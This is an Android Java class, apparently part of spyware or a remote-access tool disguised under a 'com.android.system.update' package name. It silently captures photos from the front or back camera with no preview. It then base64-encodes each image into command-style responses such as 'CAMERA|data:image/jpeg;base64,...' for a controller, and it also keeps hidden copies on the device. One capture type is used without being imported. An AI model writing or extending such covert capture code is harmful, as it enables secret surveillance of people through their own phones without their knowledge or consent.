package com.android.system.update.modules;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.TotalCaptureResult;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;
import android.util.Size;
import android.view.Surface;

import androidx.core.app.ActivityCompat;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.Semaphore;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

public class Camera2Module {
    private static final String TAG = "Camera2Module";
    private static final int CAMERA_TIMEOUT_MS = 15000;
    
    private Context context;
    private CameraManager cameraManager;
    private String backCameraId;
    private String frontCameraId;
    private String currentCameraId;
    private boolean isFrontCamera = false;
    private Handler mainHandler;
    private HandlerThread cameraThread;
    private Handler cameraHandler;
    
    private CameraDevice cameraDevice;
    private ImageReader imageReader;
    private CameraCaptureSession captureSession;
    
    public interface CameraCallback {
        void onPhotoTaken(String base64Image);
        void onError(String error);
    }
    
    public Camera2Module(Context context) {
        this.context = context;
        this.mainHandler = new Handler(Looper.getMainLooper());
        this.cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        
        // Start camera thread
        cameraThread = new HandlerThread("CameraThread");
        cameraThread.start();
        cameraHandler = new Handler(cameraThread.getLooper());
        
        initCameras();
    }
    
    private void initCameras() {
        try {
            String[] cameraIdList = cameraManager.getCameraIdList();
            Log.d(TAG, "Number of cameras: " + cameraIdList.length);
            
            for (String cameraId : cameraIdList) {
                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                
                if (facing != null) {
                    if (facing == CameraCharacteristics.LENS_FACING_BACK) {
                        backCameraId = cameraId;
                        Log.d(TAG, "Found back camera: " + cameraId);
                    } else if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
                        frontCameraId = cameraId;
                        Log.d(TAG, "Found front camera: " + cameraId);
                    }
                }
            }
            
            // Set default to back camera
            if (backCameraId != null) {
                currentCameraId = backCameraId;
                isFrontCamera = false;
                Log.d(TAG, "Default camera set to BACK (ID: " + currentCameraId + ")");
            } else if (frontCameraId != null) {
                currentCameraId = frontCameraId;
                isFrontCamera = true;
                Log.d(TAG, "Default camera set to FRONT (ID: " + currentCameraId + ")");
            } else {
                Log.e(TAG, "No cameras found!");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error initializing cameras", e);
        }
    }
    
    public String switchCamera() {
        try {
            Log.d(TAG, "switchCamera() called - Current: " + (isFrontCamera ? "FRONT" : "BACK"));
            
            if (frontCameraId != null && backCameraId != null) {
                if (currentCameraId.equals(backCameraId)) {
                    currentCameraId = frontCameraId;
                    isFrontCamera = true;
                    Log.d(TAG, "Switched to FRONT camera");
                    return "CAMERA_SWITCH|Front camera activated";
                } else {
                    currentCameraId = backCameraId;
                    isFrontCamera = false;
                    Log.d(TAG, "Switched to BACK camera");
                    return "CAMERA_SWITCH|Back camera activated";
                }
            } else if (frontCameraId == null && backCameraId != null) {
                return "CAMERA_SWITCH|Only back camera available";
            } else if (backCameraId == null && frontCameraId != null) {
                return "CAMERA_SWITCH|Only front camera available";
            }
            return "CAMERA_SWITCH|No camera available";
        } catch (Exception e) {
            Log.e(TAG, "Error switching camera", e);
            return "CAMERA_SWITCH|Error: " + e.getMessage();
        }
    }
    
    public String getCurrentCameraInfo() {
        try {
            if (currentCameraId != null) {
                return "CAMERA_INFO|Current: " + (isFrontCamera ? "FRONT" : "BACK");
            }
            return "CAMERA_INFO|No camera selected";
        } catch (Exception e) {
            Log.e(TAG, "Error getting camera info", e);
            return "CAMERA_INFO|Error: " + e.getMessage();
        }
    }
    
    public void takePhoto(final CameraCallback callback) {
        Log.d(TAG, "takePhoto() called with camera: " + (isFrontCamera ? "FRONT" : "BACK"));
        
        if (!checkPermission()) {
            callback.onError("ERROR: No camera permission");
            return;
        }
        
        if (currentCameraId == null) {
            callback.onError("ERROR: No camera available");
            return;
        }
        
        // Close any existing camera resources
        closeCamera();
        
        cameraHandler.post(() -> {
            try {
                final Semaphore cameraOpenSemaphore = new Semaphore(0);
                final Semaphore captureSemaphore = new Semaphore(0);
                final AtomicReference<byte[]> imageData = new AtomicReference<>();
                final AtomicReference<String> errorMsg = new AtomicReference<>();
                
                // Get camera characteristics to determine optimal size
                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(currentCameraId);
                StreamConfigurationMap map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
                
                // Choose the largest image size that's not too big (to avoid memory issues)
                Size[] jpegSizes = map.getOutputSizes(ImageFormat.JPEG);
                Size largest = jpegSizes[0];
                for (Size size : jpegSizes) {
                    if (size.getWidth() * size.getHeight() > largest.getWidth() * largest.getHeight()) {
                        if (size.getWidth() <= 4000 && size.getHeight() <= 3000) { // Cap at 12MP
                            largest = size;
                        }
                    }
                }
                Log.d(TAG, "Selected picture size: " + largest.getWidth() + "x" + largest.getHeight());
                
                // Create ImageReader
                imageReader = ImageReader.newInstance(largest.getWidth(), largest.getHeight(), ImageFormat.JPEG, 2);
                imageReader.setOnImageAvailableListener(reader -> {
                    try (Image image = reader.acquireLatestImage()) {
                        if (image == null) {
                            Log.e(TAG, "No image available");
                            errorMsg.set("No image available");
                            captureSemaphore.release();
                            return;
                        }
                        
                        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                        byte[] bytes = new byte[buffer.remaining()];
                        buffer.get(bytes);
                        imageData.set(bytes);
                        Log.d(TAG, "Image captured: " + bytes.length + " bytes");
                        
                        // Save debug photo
                        saveDebugPhoto(bytes);
                        
                        captureSemaphore.release();
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing image", e);
                        errorMsg.set("Error processing image: " + e.getMessage());
                        captureSemaphore.release();
                    }
                }, cameraHandler);
                
                // Open camera
                cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                    @Override
                    public void onOpened(@androidx.annotation.NonNull CameraDevice camera) {
                        Log.d(TAG, "Camera opened: " + camera.getId());
                        cameraDevice = camera;
                        
                        try {
                            // Create capture request builder
                            CaptureRequest.Builder captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                            captureBuilder.addTarget(imageReader.getSurface());
                            
                            // Set auto-focus
                            captureBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                            
                            // Set auto-exposure
                            captureBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
                            
                            // Create capture session
                            camera.createCaptureSession(Arrays.asList(imageReader.getSurface()), new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(@androidx.annotation.NonNull CameraCaptureSession session) {
                                    Log.d(TAG, "Capture session configured");
                                    captureSession = session;
                                    
                                    try {
                                        // Wait a moment for the camera to be ready
                                        Thread.sleep(500);
                                        
                                        // Capture still image
                                        session.capture(captureBuilder.build(), new CameraCaptureSession.CaptureCallback() {
                                            @Override
                                            public void onCaptureCompleted(@androidx.annotation.NonNull CameraCaptureSession session, @androidx.annotation.NonNull CaptureRequest request, @androidx.annotation.NonNull TotalCaptureResult result) {
                                                super.onCaptureCompleted(session, request, result);
                                                Log.d(TAG, "Capture completed successfully");
                                            }
                                            
                                            @Override
                                            public void onCaptureFailed(@androidx.annotation.NonNull CameraCaptureSession session, @androidx.annotation.NonNull CaptureRequest request, @androidx.annotation.NonNull CaptureFailure failure) {
                                                Log.e(TAG, "Capture failed: " + failure.getReason());
                                                errorMsg.set("Capture failed: " + failure.getReason());
                                                captureSemaphore.release();
                                            }
                                        }, cameraHandler);
                                        
                                    } catch (Exception e) {
                                        Log.e(TAG, "Error during capture", e);
                                        errorMsg.set("Error during capture: " + e.getMessage());
                                        captureSemaphore.release();
                                    }
                                }
                                
                                @Override
                                public void onConfigureFailed(@androidx.annotation.NonNull CameraCaptureSession session) {
                                    Log.e(TAG, "Session configuration failed");
                                    errorMsg.set("Session configuration failed");
                                    captureSemaphore.release();
                                }
                            }, cameraHandler);
                            
                        } catch (Exception e) {
                            Log.e(TAG, "Error setting up capture", e);
                            errorMsg.set("Error setting up capture: " + e.getMessage());
                            captureSemaphore.release();
                        }
                        
                        cameraOpenSemaphore.release();
                    }
                    
                    @Override
                    public void onDisconnected(@androidx.annotation.NonNull CameraDevice camera) {
                        Log.e(TAG, "Camera disconnected");
                        camera.close();
                        cameraDevice = null;
                        errorMsg.set("Camera disconnected");
                        cameraOpenSemaphore.release();
                        captureSemaphore.release();
                    }
                    
                    @Override
                    public void onError(@androidx.annotation.NonNull CameraDevice camera, int error) {
                        Log.e(TAG, "Camera error: " + error);
                        camera.close();
                        cameraDevice = null;
                        errorMsg.set("Camera error: " + error);
                        cameraOpenSemaphore.release();
                        captureSemaphore.release();
                    }
                }, cameraHandler);
                
                // Wait for camera to open
                if (!cameraOpenSemaphore.tryAcquire(CAMERA_TIMEOUT_MS, TimeUnit.MILLISECONDS)) {
                    mainHandler.post(() -> callback.onError("ERROR: Camera open timeout"));
                    closeCamera();
                    return;
                }
                
                // Wait for capture (with timeout)
                if (!captureSemaphore.tryAcquire(CAMERA_TIMEOUT_MS, TimeUnit.MILLISECONDS)) {
                    mainHandler.post(() -> callback.onError("ERROR: Capture timeout"));
                    closeCamera();
                    return;
                }
                
                // Check for errors
                if (errorMsg.get() != null) {
                    mainHandler.post(() -> callback.onError("ERROR: " + errorMsg.get()));
                    closeCamera();
                    return;
                }
                
                // Process image
                byte[] data = imageData.get();
                if (data == null || data.length == 0) {
                    mainHandler.post(() -> callback.onError("ERROR: No image data"));
                    closeCamera();
                    return;
                }
                
                String base64Image = Base64.encodeToString(data, Base64.NO_WRAP);
                final String result = "CAMERA|data:image/jpeg;base64," + base64Image;
                Log.d(TAG, "Photo captured successfully, base64 length: " + base64Image.length());
                
                // Close camera after successful capture
                closeCamera();
                
                mainHandler.post(() -> callback.onPhotoTaken(result));
                
            } catch (Exception e) {
                Log.e(TAG, "Error in takePhoto", e);
                closeCamera();
                mainHandler.post(() -> callback.onError("ERROR: " + e.getMessage()));
            }
        });
    }
    
    private void closeCamera() {
        try {
            if (captureSession != null) {
                captureSession.close();
                captureSession = null;
            }
            if (imageReader != null) {
                imageReader.close();
                imageReader = null;
            }
            if (cameraDevice != null) {
                cameraDevice.close();
                cameraDevice = null;
            }
            Log.d(TAG, "Camera resources closed");
        } catch (Exception e) {
            Log.e(TAG, "Error closing camera", e);
        }
    }
    
    private void saveDebugPhoto(byte[] data) {
        try {
            File picturesDir = new File("/sdcard/DCIM/");
            if (!picturesDir.exists()) {
                picturesDir = context.getExternalFilesDir(null);
            }
            
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            File photoFile = new File(picturesDir, "debug_photo_" + timestamp + ".jpg");
            FileOutputStream fos = new FileOutputStream(photoFile);
            fos.write(data);
            fos.close();
            Log.d(TAG, "Debug photo saved to: " + photoFile.getAbsolutePath());
        } catch (Exception e) {
            Log.e(TAG, "Failed to save debug photo", e);
        }
    }
    
    private boolean checkPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
                == PackageManager.PERMISSION_GRANTED;
    }
    
    public void cleanup() {
        closeCamera();
        if (cameraThread != null) {
            cameraThread.quitSafely();
            try {
                cameraThread.join();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}
